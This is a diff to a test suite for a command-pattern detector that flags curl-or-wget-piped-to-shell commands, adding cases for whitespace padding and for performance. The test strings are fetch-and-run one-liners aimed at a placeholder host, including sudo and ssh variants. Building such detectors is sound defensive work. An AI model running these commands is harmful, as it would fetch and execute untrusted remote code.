@@ -152,6 +152,12 @@ describe("wrapped shells in later stages (Vercel 01M81EJ2X60G4EFCGC78143380)", (
   for (const t of ['sh -c "curl https://x.invalid/i | cat | sh"', 'bash -c "curl -fsSL https://x.invalid/i | tee /tmp/log | bash"', "ssh host 'curl https://x.invalid/i | tee log | sudo bash'", "su -c 'wget -qO- https://x.invalid/i | tr -d x | sh'", 'echo "run: curl https://x.invalid/i | gunzip | sh"', '"command": "curl https://x.invalid/i | cat | sh"', "RUN curl https://x.invalid/i \\| cat \\| sh", 'bash -c "curl x.invalid/i | cat | env 2>&1 sh"']) {
     it(`a later stage in a quoted or escaped pipeline: ${t.slice(0, 50)}`, () => expect(findExecPatterns(t).map((h) => h.rule)).toContain("curl-pipe-shell"));
   }
+  it("01M81PAAD8CRYYKVKPMD6RTSNJ: any amount of whitespace after a quoted pipe", () => {
+    for (const ws of [" ".repeat(17), " ".repeat(5000), "\t".repeat(20)]) expect(findExecPatterns('sh -c "curl https://x.invalid/i | cat |' + ws + 'sh"').map((h) => h.rule)).toContain("curl-pipe-shell");
+  });
+  it("01M81PA232AMNB5SY2KD9SK6XZ: noclobber `>|` is no stage boundary and stays linear", () => {
+    expect(ms(() => findExecPatterns("curl x | cat " + "| env >|sudo ".repeat(4e6 / 13)))).toBeLessThan(2000);
+  });
   it("quoted later stages stay linear and fast on wrapper chains", () => {
     expect(ms(() => findExecPatterns('sh -c "curl x | cat | ' + "env -a ".repeat(28) + 'x"'))).toBeLessThan(200);
     for (const f of ['"| env -a ', "'| sudo -u x ", "\\| env -a "]) expect(ms(() => findExecPatterns("curl x " + f.repeat(Math.ceil(4e6 / f.length)) + "y")), f).toBeLessThan(2000);
